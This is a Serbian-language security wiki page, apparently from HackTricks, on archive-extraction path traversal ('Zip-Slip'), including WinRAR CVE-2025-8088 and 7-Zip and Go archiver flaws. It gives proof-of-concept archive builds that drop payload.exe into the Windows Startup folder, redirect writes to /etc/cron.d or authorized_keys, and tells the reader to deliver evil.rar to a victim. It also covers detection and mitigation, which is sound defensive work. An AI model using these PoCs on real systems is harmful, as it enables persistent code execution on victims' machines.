# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Pregled

Mnogi formati arhiva (ZIP, RAR, TAR, 7-ZIP itd.) omogućavaju da svaki unos sadrži sopstvenu **internu putanju**. Kada alat za raspakivanje slepo poštuje tu putanju, posebno ime datoteke koje sadrži `..` ili **apsolutnu putanju** (npr. `C:\Windows\System32\`) biće zapisano izvan direktorijuma koji je korisnik izabrao.
Ova klasa ranjivosti je poznata kao *Zip-Slip* ili **path traversal pri raspakivanju arhive**.

Posledice se kreću od prepisivanja proizvoljnih datoteka do direktnog postizanja **remote code execution (RCE)** ubacivanjem payload-a na lokaciju sa **auto-run** funkcijom, kao što je Windows *Startup* folder.

## Osnovni uzrok

1. Napadač kreira arhivu u kojoj jedno ili više zaglavlja datoteka sadrže:
* Sekvence relativnog traversal-a (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Apsolutne putanje (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ili posebno izrađene **symlinks** koji se razrešavaju izvan ciljnog direktorijuma (uobičajeno kod ZIP/TAR na *nix* sistemima).
2. Žrtva raspakuje arhivu pomoću ranjivog alata koji veruje ugrađenoj putanji (ili prati symlinks), umesto da je sanitizuje ili forsira raspakivanje unutar izabranog direktorijuma.
3. Datoteka se zapisuje na lokaciju pod kontrolom napadača i izvršava/učitava sledeći put kada sistem ili korisnik aktivira tu putanju.

### .NET `Path.Combine` + `ZipArchive` traversal

Uobičajen .NET anti-pattern je kombinovanje predviđenog odredišta sa `user-controlled` vrednošću `ZipArchiveEntry.FullName` i raspakivanje bez normalizacije putanje:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Ako `entry.FullName` počinje sa `..\\`, omogućava traversal; ako je **absolute path**, leva komponenta se u potpunosti odbacuje, što kao extraction identity omogućava **arbitrary file write**.
- Proof-of-concept archive za upis u susedni `app` direktorijum koji nadgleda scheduled scanner:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Ubaciivanje tog ZIP-a u nadzirano prijemno sanduče rezultira fajlom `C:\samples\app\0xdf.txt`, čime se dokazuje traversal izvan direktorijuma `C:\samples\queue\` i omogućavaju naknadni primitives (npr. DLL hijacks).

## Primer iz stvarnog sveta – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR za Windows (uključujući CLI alate `rar` / `unrar`, DLL i prenosivi source) nije uspevao da validira nazive fajlova tokom ekstrakcije.
Maliciozni RAR archive koji sadrži stavku poput:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
bi završio **izvan** izabranog izlaznog direktorijuma i unutar korisničkog foldera *Startup*. Nakon prijavljivanja, Windows automatski izvršava sve što se tamo nalazi, čime se obezbeđuje *persistent* RCE.<sup>[[5]](#references)</sup>

### Kreiranje PoC arhive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Korišćene opcije:
* `-ep`  – čuva putanje datoteka tačno onako kako su navedene (ne uklanja početni `./`).

Isporučite `evil.rar` žrtvi i uputite je da ga raspakuje pomoću ranjive verzije WinRAR-a.

### Uočena eksploatacija u praksi

ESET je prijavio spear-phishing kampanje grupe RomCom (Storm-0978/UNC2596) koje su sadržale RAR arhive koje zloupotrebljavaju CVE-2025-8088 za instaliranje prilagođenih backdoor-a i olakšavanje ransomware operacija.<sup>[[5]](#references)</sup>

## Noviji slučajevi (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Greška**: ZIP unosi koji su **simboličke veze** dereferencirani su tokom raspakivanja, što napadačima omogućava izlazak iz odredišnog direktorijuma i prepisivanje proizvoljnih putanja. Interakcija korisnika svodi se samo na *otvaranje/raspakivanje* arhive.<sup>[[1]](#references)</sup>
* **Pogođene verzije**: 7-Zip 21.02–24.09 (Windows i Linux build-ovi). Ispravljeno u verziji **25.00** (jul 2025) i novijim verzijama.
* **Putanja uticaja**: Prepisivanje lokacija `Start Menu/Programs/Startup` ili lokacija koje pokreću servise → kod se izvršava pri sledećoj prijavi ili ponovnom pokretanju servisa.
* **Brzi PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Na zakrpljenoj verziji `/etc/cron.d` neće biti izmenjen; symlink se raspakuje kao veza unutar `/tmp/target`.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Greška**: `archiver.Unarchive()` prati `../` i symlink ZIP unose, upisujući podatke izvan `outputDir`.<sup>[[2]](#references)</sup>
* **Pogođeno**: `github.com/mholt/archiver` ≤ 3.5.1 (projekat je sada zastareo).
* **Ispravka**: Pređite na `mholt/archives` ≥ 0.1.0 ili implementirajte provere kanonske putanje pre upisivanja.
* **Minimalna reprodukcija**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Saveti za detekciju

* **Statička inspekcija** – Izlistajte unose arhive i označite svaki naziv koji sadrži `../`, `..\\`, *apsolutne putanje* (`/`, `C:`) ili unose tipa *symlink* čiji cilj izlazi iz direktorijuma za raspakivanje.
* **Kanonikalizacija** – Uverite se da `realpath(join(dest, name))` i dalje počinje sa `dest`. U suprotnom odbijte unos.<sup>[[3]](#references)</sup>
* **Raspakivanje u sandbox-u** – Dekompresujte u privremeni direktorijum za jednokratnu upotrebu pomoću *bezbednog* extractora (npr. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) i proverite da rezultujuće putanje ostaju unutar direktorijuma.
* **Nadgledanje endpoint-a** – Upozorite na nove izvršne datoteke upisane u lokacije `Startup`/`Run`/`cron` ubrzo nakon što je arhivu otvorio WinRAR/7-Zip/itd.

## Ublažavanje i hardening

1. **Ažurirajte extractor** – WinRAR 7.13+ i 7-Zip 25.00+ implementiraju sanitizaciju putanja/symlink-ova. Nijedan od ova dva alata i dalje nema automatsko ažuriranje.
2. Kad god je moguće, raspakujte arhive uz opciju “**Do not extract paths**” / “**Ignore paths**”.
3. Na Unix-u smanjite privilegije i montirajte **chroot/namespace** pre raspakivanja; na Windows-u koristite **AppContainer** ili sandbox.
4. Ako pišete prilagođeni kod, normalizujte pomoću `realpath()`/`PathCanonicalize()` **pre** kreiranja/upisivanja i odbijte svaki unos koji izlazi iz odredišta.

## Dodatni pogođeni / istorijski slučajevi

* 2018 – Veliko *Zip-Slip* upozorenje kompanije Snyk koje je obuhvatilo mnoge Java/Go/JS biblioteke.
* 2023 – 7-Zip CVE-2023-4011, slično traversal ponašanje tokom spajanja pomoću `-ao`.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377), traversal tokom TAR raspakivanja slug-ova (zakrpa u verziji v1.2).
* Bilo koja prilagođena logika raspakivanja koja ne pozove `PathCanonicalize` / `realpath` pre upisivanja.

## Reference

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)

{{#include ../banners/hacktricks-training.md}}
